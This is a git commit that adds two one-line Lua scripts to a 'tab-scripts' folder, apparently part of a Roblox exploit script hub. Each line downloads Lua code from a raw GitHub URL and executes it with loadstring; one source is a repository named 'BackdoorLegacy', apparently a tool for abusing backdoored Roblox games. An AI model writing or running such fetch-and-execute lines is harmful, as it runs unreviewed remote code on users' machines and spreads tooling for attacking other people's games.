5e3e1ff19a8eaac2effb3c2dc4c8dfecfe70afdf
Aitekus <aitek18okt2@gmail.com>
2025-02-19 17:23:02 +0300

    Add files via upload

---
+++ tab-scripts/Tab 5.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua'))();
---
+++ tab-scripts/Tab 8.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Aitekus/main/refs/heads/main/ROBLOX-NIKITOS/Main.lua'))()
